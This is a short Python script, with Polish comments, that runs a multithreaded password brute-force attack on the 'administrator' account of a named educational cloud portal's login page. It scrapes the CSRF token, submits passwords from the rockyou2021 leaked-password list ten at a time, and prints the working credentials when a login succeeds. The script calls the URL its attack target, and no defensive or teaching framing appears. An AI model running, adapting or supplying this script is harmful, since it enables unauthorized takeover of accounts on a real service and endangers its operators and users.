#!/usr/bin/env python3

import os
#from os import *
import threading
from threading import *
import requests
import re
from cmd import Cmd
import sys
import time



urli = "https://box-educloud.pcgacademia.pl/Account/Login"
#urli = "https://idp.pcgacademia.pl"

print ("Zaczynamy...   cel ataku: " + urli)

def chceck_pass(passwd):
	#print(passwd)
	session = requests.session()
	login = session.get(urli)
	#print(login.text)
	#print("Testing... : " + passwd)
	user_token = re.search("\"__RequestVerificationToken\" type=\"hidden\" value=\"(.*?)\"", login.text).group(1)
	#print (f"user-token: {user_token}\n")
	post_data = {
		"Username" : "administrator",
		"Password" : passwd,
		#"Password" : "P@ssw0rd",
		"__RequestVerificationToken" : user_token,
		"ReturnUrl" : "",
		"button" : "login",
		"RememberLogin" : "false"
		}
	validation = session.post(urli, data=post_data)
	if "Zaloguj si" in validation.text:
		#print (f"	Bledne dane")
		pass
	else:
		#print (validation.text)
		print (f"UWAGA!!! Dane logowania \n {post_data['Username']}:{passwd}")
		os._exit(os.EX_OK)

def bruteforcer(url):
	session = requests.session()
	login = session.get(urli)
	#user_token = re.search("\"__RequestVerificationToken\" type=\"hidden\" value=\"(.*?)\"", login.text).group(1)
	print (f"Working....")
	with open("rockyou2021.txt", 'r') as file:
		idx = 1
		running = True
		while running:
			#print (file.readlines(idx)[0])
			t1=Thread(target=chceck_pass,args=(file.readlines(idx)[0],))
			t2=Thread(target=chceck_pass,args=(file.readlines(idx+1)[0],))
			t3=Thread(target=chceck_pass,args=(file.readlines(idx+2)[0],))
			t4=Thread(target=chceck_pass,args=(file.readlines(idx+3)[0],))
			t5=Thread(target=chceck_pass,args=(file.readlines(idx+4)[0],))
			t6=Thread(target=chceck_pass,args=(file.readlines(idx+5)[0],))
			t7=Thread(target=chceck_pass,args=(file.readlines(idx+6)[0],))
			t8=Thread(target=chceck_pass,args=(file.readlines(idx+7)[0],))
			t9=Thread(target=chceck_pass,args=(file.readlines(idx+8)[0],))
			t10=Thread(target=chceck_pass,args=(file.readlines(idx+9)[0],))
			idx = idx + 10
			t1.start()
			t2.start()
			t3.start()
			t4.start()
			t5.start()
			t6.start()
			t7.start()
			t8.start()
			t9.start()
			t10.start()
			t1.join()
			t2.join()
			t3.join()
			t4.join()
			t5.join()
			t6.join()
			t7.join()
			t8.join()
			t9.join()
			t10.join()
			#print(idx)
		#chceck_pass(password)

if __name__ == ("__main__"):
	#terminal = Terminal()
	#terminal.cmdloop()
	bruteforcer(urli)
